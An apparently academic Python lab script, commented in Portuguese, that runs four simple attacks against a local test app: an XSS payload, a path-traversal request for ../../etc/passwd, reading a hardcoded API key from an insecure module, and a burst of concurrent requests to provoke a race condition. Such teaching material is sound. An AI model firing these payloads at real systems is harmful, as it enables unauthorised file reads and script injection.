"""
ataque.py
Demonstração acadêmica de exploração de vulnerabilidades
NÃO EXECUTAR EM PRODUÇÃO
"""

import requests
import pickle

# ==========================================================
# 1) CROSS-SITE SCRIPTING (XSS)
# ==========================================================

def ataque_xss():
    payload = "<script>alert('XSS');</script>"
    print("[XSS] Enviando payload malicioso...")
    resp = requests.post("http://localhost:5000/comentario", data={"texto": payload})
    print("Resposta:", resp.text)


# ==========================================================
# 2) PATH TRAVERSAL
# ==========================================================

def ataque_path_traversal():
    payload = "../../etc/passwd"
    print("[Traversal] Tentando ler arquivo sensível...")
    resp = requests.get(f"http://localhost:5000/abrir?arquivo={payload}")
    print("Conteúdo retornado:", resp.text[:200], "...")  # print parcial


# ==========================================================
# 3) HARDCODED SECRETS (simulação de vazamento)
# ==========================================================

def ataque_segredo_exposto():
    print("[Secrets] Simulando leitura de segredo exposto em código...")
    import defesa  # defensor inseguro com segredo hardcoded
    print("Segredo obtido:", defesa.API_KEY)


# ==========================================================
# 4) RACE CONDITION
# ==========================================================

import threading

def escrever():
    requests.get("http://localhost:5000/escrever")

def ataque_race_condition():
    print("[Race] Disparando múltiplas requisições simultâneas...")
    threads = []
    for _ in range(20):
        t = threading.Thread(target=escrever)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print("Ataque de race finalizado.")


# ==========================================================
# EXECUÇÃO
# ==========================================================

if __name__ == "__main__":
    ataque_xss()
    ataque_path_traversal()
    ataque_segredo_exposto()
    ataque_race_condition()
